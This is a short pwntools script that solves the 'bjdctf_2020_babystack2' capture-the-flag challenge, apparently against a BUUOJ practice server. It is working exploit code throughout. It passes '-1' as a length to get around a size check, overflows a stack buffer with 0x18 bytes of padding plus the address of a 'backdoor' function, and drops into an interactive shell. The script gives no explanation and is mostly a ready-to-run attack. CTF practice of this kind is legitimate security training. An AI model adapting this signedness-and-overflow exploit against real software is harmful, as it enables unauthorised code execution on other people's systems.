
from pwn import*
elf=ELF('./bjdctf_2020_babystack2')
p=remote('node4.buuoj.cn',27224)
#p=process('./bjdctf_2020_babystack2')
backdoor=elf.sym['backdoor']
p.sendlineafter(b"name:\n",b'-1')
payload=b'a'*0x18+p64(backdoor)
p.sendlineafter(b"name?\n",payload)
p.interactive()
